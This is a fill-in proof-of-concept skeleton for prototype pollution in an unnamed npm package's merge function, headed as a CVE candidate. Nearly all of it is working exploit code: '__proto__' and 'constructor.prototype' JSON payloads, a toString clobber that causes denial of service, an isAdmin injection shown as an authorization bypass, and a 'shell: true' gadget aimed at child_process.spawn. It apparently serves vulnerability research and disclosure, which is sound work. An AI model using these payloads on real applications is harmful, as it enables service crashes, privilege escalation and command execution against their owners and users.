# PoC Skeleton -- Prototype Pollution

## Basic Prototype Pollution PoC

```js
/**
 * CVE-CANDIDATE: Prototype Pollution in [package-name] [version]
 * CWE: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
 * CVSS: 7.5 HIGH
 */
const { merge } = require('[package-name]');

// Step 1: Pollute Object.prototype
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');
merge({}, malicious);

// Step 2: Verify pollution
const clean = {};
console.log('[+] clean.polluted:', clean.polluted);
// Expected: true (property inherited from polluted prototype)

// Step 3: Demonstrate impact (DoS via toString clobber)
const crash = JSON.parse('{"__proto__": {"toString": 1}}');
merge({}, crash);
try {
  const obj = {};
  obj + "";  // Calls toString, which is now 1 (not a function)
} catch (e) {
  console.log("[+] DoS confirmed:", e.message);
  // TypeError: Cannot convert object to primitive value
}
```

## Constructor Variant

```js
const malicious = JSON.parse('{"constructor": {"prototype": {"polluted": true}}}');
merge({}, malicious);

const clean = {};
console.log("[+] clean.polluted:", clean.polluted);
```

## Impact Demonstration

```js
// DoS: toString crash
merge({}, JSON.parse('{"__proto__": {"toString": 1}}'));
try { ({}) + ""; } catch(e) { console.log("[+] DoS:", e.message); }

// Property injection: isAdmin
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
if ({}.isAdmin) console.log("[+] Auth bypass: isAdmin is true");

// Gadget chain (if applicable): shell option
merge({}, JSON.parse('{"__proto__": {"shell": true}}'));
// If any child_process.spawn is called without explicit shell option,
// it will inherit shell:true from prototype
```
